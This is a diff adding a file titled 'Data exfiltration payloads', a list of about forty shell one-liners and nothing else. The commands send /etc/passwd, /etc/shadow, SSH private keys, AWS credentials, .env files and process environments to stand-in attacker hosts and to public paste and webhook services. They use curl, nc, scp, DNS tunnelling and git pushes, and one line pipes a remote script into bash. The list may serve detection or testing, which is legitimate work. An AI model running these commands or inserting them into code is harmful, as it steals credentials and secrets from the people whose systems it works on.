@@ -1,0 +1,42 @@
+# Data exfiltration payloads
+curl -X POST -d @/etc/passwd https://evil.com/collect
+wget -q -O- https://evil.com/c2 | bash
+curl https://evil.com/exfil?data=$(cat ~/.aws/credentials | base64)
+nc evil.com 8080 < /etc/shadow
+scp ~/.ssh/id_rsa attacker@evil.com:/loot/
+rsync -avz /home/user/secrets/ attacker@evil.com:/exfil/
+curl -F "file=@$HOME/.env" https://webhook.site/abc-123
+python3 -c "import urllib.request; urllib.request.urlopen('https://evil.com/c2?k='+open('.env').read())"
+curl --data-binary @/etc/shadow https://evil.com/steal
+curl https://evil.com/$(hostname)/$(whoami)/$(cat /etc/machine-id)
+dig +short $(cat /etc/passwd | base64 | tr -d '\n').evil.com
+nslookup $(cat ~/.aws/credentials | xxd -p | head -c63).evil.com
+curl -H "X-Data: $(cat .env)" https://httpbin.org/headers
+curl -F "stolen=@/etc/passwd" https://evil.com/upload
+tar czf - ~/.ssh | openssl enc -aes-256-cbc -pass pass:secret | curl -X POST -d @- https://evil.com
+dig +short $(cat /etc/passwd | base64 | tr -d '\n').attacker.com
+nslookup $(whoami).$(hostname).exfil.attacker.net
+for c in $(cat secret.txt|xxd -p); do dig $c.tunnel.evil.com; done
+host $(cat ~/.aws/credentials | base64 | head -c 60).dns.evil.io
+echo "data" | dig @8.8.8.8 $(cat /etc/passwd|base32).leak.evil.com +short
+curl -s https://attacker.com/`whoami`.`hostname`.beacon
+curl "https://c2.evil.com/p?d=$(cat ~/.ssh/id_rsa|base64)"
+env | curl -X POST --data-binary @- https://evil.com/collect
+printenv | nc attacker.com 4444
+cat /proc/self/environ | curl -d @- http://evil.com/env
+tr '\0' '\n' < /proc/self/environ | base64 | curl -d @- https://c2.evil.net
+base64 /proc/self/environ | nc evil.com 53
+cat ~/.ssh/id_rsa | base64 | curl -X POST -d @- https://hook.evil.com
+tar czf - ~/.aws | base64 | nc attacker.com 9001
+curl -F "f=@/etc/shadow" https://0x0.st
+curl --upload-file /etc/passwd https://transfer.sh/passwd
+curl -T ~/.aws/credentials https://file.io
+cat /etc/passwd | nc termbin.com 9999
+git remote add exfil http://x:y@attacker.com:8080/repo.git && git push exfil --all
+git push https://x:token@evil.com/loot.git main
+curl -X POST -d @secrets.json https://webhook.site/8f1c-aaaa-bbbb
+curl --data-urlencode "d@/home/user/.env" https://requestbin.net/r/abc
+curl -d @- http://evil.com < /etc/passwd
+nc paste.rs 9999 < ~/.bash_history
+curl https://oast.fun/?x=$(id)
+git remote set-url origin git://10.0.0.5/exfil.git
